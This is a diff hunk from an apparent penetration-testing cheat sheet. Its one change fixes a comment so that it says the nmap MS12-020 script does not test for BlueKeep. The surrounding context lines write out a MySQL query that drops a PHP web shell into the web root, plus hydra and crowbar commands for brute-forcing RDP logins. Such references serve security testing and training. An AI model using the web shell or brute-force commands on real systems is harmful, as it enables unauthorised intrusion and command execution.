@@ -232,7 +232,7 @@ mysql> SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell
 hydra -l admin -P wordlist.txt rdp://TARGET
 crowbar -b rdp -s TARGET/32 -u admin -C wordlist.txt
 
-# BlueKeep (CVE-2019-0708)
+# MS12-020 check (this script does NOT test BlueKeep/CVE-2019-0708)
 nmap -p 3389 --script rdp-vuln-ms12-020 TARGET
 
 # Session hijacking (if SYSTEM on target)
